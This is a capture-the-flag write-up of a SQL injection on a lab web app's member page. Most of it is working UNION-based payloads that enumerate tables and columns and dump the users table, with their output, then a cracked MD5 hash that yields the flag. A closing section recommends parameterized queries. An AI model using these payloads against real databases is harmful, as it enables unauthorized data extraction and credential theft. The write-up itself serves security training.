# SQLI users

### Breach Exploit
From /?page=member we have an sql injection where we can dump all the db:

```
42 OR 1

First name: one
Surname : me

First name: two
Surname : me

First name: three
Surname : me

First name: Flag
Surname : GetThe
```

Get informations about tables:

```
42 UNION ALL SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES

Database: Member_Brute_Force
Table: db_default

Database: Member_Sql_Injection
Table: users

Database: Member_guestbook
Table: guestbook

Database: Member_images
Table: list_images

Database: Member_survey
Table: vote_dbs
```

Get informations about column name:

```
42 UNION ALL SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS

First name: db_default
Surname : id

First name: db_default
Surname : username

First name: db_default
Surname : password

First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

First name: guestbook
Surname : id_comment

First name: guestbook
Surname : comment

First name: guestbook
Surname : name

First name: list_images
Surname : id

First name: list_images
Surname : url

First name: list_images
Surname : title

First name: list_images
Surname : comment

First name: vote_dbs
Surname : id_vote

First name: vote_dbs
Surname : vote

First name: vote_dbs
Surname : nb_vote

First name: vote_dbs
Surname : subject
```

Dump the users table:

```
42 UNION ALL SELECT CONCAT(USER_ID, 0x0A, FIRST_NAME, 0x0A, FIRST_NAME, 0x0A, LAST_NAME, 0x0A, TOWN, 0x0A, COUNTRY, 0x0A, PLANET, 0x0A, COMMENTAIRE, 0x0A, COUNTERSIGN), 42 FROM users 

First name: 5
Flag
Flag
GetThe
42
42
42
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
```

Then brute force an encryp to get the flag:

```
md5(5ff9d0165b4f92b14994e5c685cdce28) = FortyTwo
sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

### Fix Breach
Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.
```https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html```

### Documentation
```https://owasp.org/www-community/attacks/SQL_Injection```
